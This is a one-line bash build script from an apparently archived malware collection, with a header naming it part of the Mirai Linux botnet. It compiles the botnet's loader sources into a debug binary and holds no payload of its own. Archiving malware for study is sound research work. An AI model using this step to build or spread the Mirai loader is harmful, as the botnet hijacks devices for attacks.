#!/bin/bash
# ------------------------------------------------------------
# name      Mirai
# type      botnet
# cve       —
# year      unknown
# os        Linux
# authors   unknown
# source    RamadhanAmizudin/malware
# archived  RamadhanAmizudin, krisyotam (2026)
# notes     —
# ------------------------------------------------------------
gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o loader.dbg
